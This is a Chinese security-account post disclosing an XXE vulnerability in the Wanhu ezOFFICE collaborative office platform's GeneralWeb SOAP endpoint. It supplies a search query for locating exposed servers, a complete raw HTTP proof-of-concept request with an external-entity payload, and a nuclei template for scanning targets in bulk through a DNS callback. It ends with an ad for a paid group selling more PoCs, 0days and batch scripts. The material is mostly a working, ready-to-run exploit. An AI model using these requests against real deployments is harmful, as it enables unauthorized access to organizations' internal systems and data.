#  漏洞推送|某户协同办公平台GeneralWeb_XXE漏洞   
 小白菜安全   2024-10-11 21:08  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
漏洞描述  
  
  
万户ezOFFICE协同管理平台是一个综合信息基础应用平台。 万户协同办公平台ezoffice GeneralWeb存在xxe漏洞。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
资产信息  
  
  
hunter:app.name="万户 Ezoffice OA"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/NhLcT1kxlia2ibXzzibVk15gaIwPj3Libib3wShmVIoO5CmmvRs8Q6IXHeiasWUOsic6Tv8HTo5P5K2TH5FHuZ3hDicZdA/640?wx_fmt=other&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
漏洞复现  
  
  
  
dnslog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2ibXzzibVk15gaIwPj3Libib3w4lQmySHydx9YWHBv0qxdiaiao2kmC606qNcibsxtkVHjuVDwzenX91sMg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2ibXzzibVk15gaIwPj3Libib3wcT7fdg98DAMR9BajPCXbZkic4nM866dXI6WDdDZiaQakLFNTyPefgS8w/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
POC  
  
```
POST /defaultroot/xfservices/./GeneralWeb HTTP/1.1
Host: 
User-Agent: Moziilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
Connection: close
Content-Length: 453
Content-Type: text/xml;charset=UTF-8
SOAPAction: 
Accept-Encoding: gzip, deflate, br

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gen="http://com.whir.service/GeneralWeb">
  <soapenv:Body>
    <gen:OAManager>
      <gen:input>
        &lt;?xml version="1.0" encoding="UTF-8"?&gt;
        &lt;!DOCTYPE root [
        &lt;!ENTITY x SYSTEM "http://xxxx.com"&gt;]&gt;
        &lt;root&gt;&amp;x;&lt;/root&gt;
      </gen:input>
    </gen:OAManager>
  </soapenv:Body>
</soapenv:Envelope>
```  
  
nuclei  
```
id: wanhu-GeneralWeb-XXE

info:
  name: 万户协同办公平台GeneralWeb_XXE漏洞
  author: 小白菜
  severity: critical
  description: |
    
  metadata:
    fofa-query: 
  reference:
    - https://
  tags: auto

http:
  - raw:
      - |
          POST /defaultroot/xfservices/./GeneralWeb HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Moziilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
          Content-Type: text/xml;charset=UTF-8
          SOAPAction: 
          Content-Length: 457

          <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gen="http://com.whir.service/GeneralWeb">
            <soapenv:Body>
              <gen:OAManager>
                <gen:input>
                  &lt;?xml version="1.0" encoding="UTF-8"?&gt;
                  &lt;!DOCTYPE root [
                  &lt;!ENTITY x SYSTEM "http://{{interactsh-url}}"&gt;]&gt;
                  &lt;root&gt;&amp;x;&lt;/root&gt;
                </gen:input>
              </gen:OAManager>
            </soapenv:Body>
          </soapenv:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol  # Confirms the DNS Interaction
        words:
          - "dns"
```  
  
  
---------------------------------------------------  
  
更多漏洞poc（包括0day漏洞）、安全工具、批量脚本加入内部圈子获取，目前只要49，无理由3天退款，加入圈子请扫描下方二维码。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/NhLcT1kxlia2ibXzzibVk15gaIwPj3Libib3wz7rEzD4jThibDB3puG8zRTD9fLx4Ndhglm3VOUhNiczqNuriccyD38ibQw/640?wx_fmt=jpeg "")  
  
  
  
漏洞文库：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2ibXzzibVk15gaIwPj3Libib3wh2bIueGiaicJL46kobAMKQCktI8HFTcVM9JpwNibdMKD9ZND0ebC0rwnw/640?wx_fmt=png&from=appmsg "")  
  
  
工具收集：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2ibXzzibVk15gaIwPj3Libib3w26uxWScqm4lh60gQawZjffnNamZQR8BylhRBdjtf15dWgFsHMwrsFQ/640?wx_fmt=png&from=appmsg "")  
  
  
脚本文库：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2ibXzzibVk15gaIwPj3Libib3wsdaXl2dhDDAJN3ZDl5fYWnGIckTK1vgLVHq2SHDDicic8OkMmMJ1fluw/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgOaSVwdVAPT7DWSKK7pjSWGdbQKWEM0yTB3JSqNxLUnEBesOW8eG40w/640?wx_fmt=png&from=appmsg "")  
  
免责声明  
  
  
该公众号主要是分享互联网上公开的一些漏洞poc和工具，  
利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如果本公众号分享导致的侵权行为请告知，我们会立即删除并道歉。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgAth2WTu4kyEzL1Dia7AXUWcP7tsbHDtpaH1cls1lJTPVNE6XTwLYvJg/640?wx_fmt=gif&from=appmsg "")  
  
  
  
